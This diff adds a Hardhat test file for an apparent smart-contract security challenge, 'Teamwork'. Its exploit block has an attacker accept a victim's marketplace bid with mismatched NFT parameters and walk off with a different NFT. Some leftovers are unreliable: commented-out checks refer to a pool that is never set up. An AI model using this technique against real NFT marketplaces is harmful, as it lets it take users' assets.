@@ -1,0 +1,80 @@
+const { ethers } = require('hardhat');
+const { expect } = require('chai');
+
+describe('[Challenge] Teamwork', function () {
+    let deployer, attacker, victim;
+
+    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, attacker, victim] = await ethers.getSigners();
+
+        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
+        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
+        const BrokenSeaFactory = await ethers.getContractFactory("BrokenSea", deployer);
+        
+        this.token = await DamnValuableToken.deploy();
+        this.nft = await DamnValuableNFTFactory.deploy();
+        this.brokenSea = await BrokenSeaFactory.deploy();
+
+        await this.token.transfer(attacker.address, ethers.utils.parseEther('1'));
+        
+        await this.nft.safeMint(victim.address);
+        await this.nft.safeMint(victim.address);
+        await this.nft.safeMint(victim.address);
+
+        await this.nft.connect(victim).setApprovalForAll(this.brokenSea.address,true);
+        await this.token.connect(victim).approve(this.brokenSea.address,ethers.utils.parseEther('1000'));
+
+        await this.nft.connect(attacker).setApprovalForAll(this.brokenSea.address,true);
+        await this.token.connect(attacker).approve(this.brokenSea.address,ethers.utils.parseEther('1000'));
+        
+
+        expect(
+            await this.nft.ownerOf(2)
+        ).to.equal(victim.address);
+
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.equal(ethers.utils.parseEther('1'));
+     
+    });
+
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE  */
+        console.log(1);
+        await this.brokenSea.connect(victim).createBid(this.nft.address,3,this.token.address,1);
+
+
+        console.log(2);
+        await this.brokenSea.connect(attacker).acceptBid(
+            victim.address,
+            this.token.address,
+            1,
+            this.nft.address,
+            1
+        );
+        console.log(3);
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.equal(ethers.utils.parseEther('1') - 1);
+
+        expect(
+            await this.nft.ownerOf(2)
+        ).to.equal(attacker.address);
+    });
+
+    // after(async function () {
+    //     /** SUCCESS CONDITIONS */
+
+    //     // Attacker has taken all tokens from the pool
+    //     expect(
+    //         await this.token.balanceOf(attacker.address)
+    //     ).to.equal(TOKENS_IN_POOL);
+    //     expect(
+    //         await this.token.balanceOf(this.pool.address)
+    //     ).to.equal('0');
+    // });
+});
+
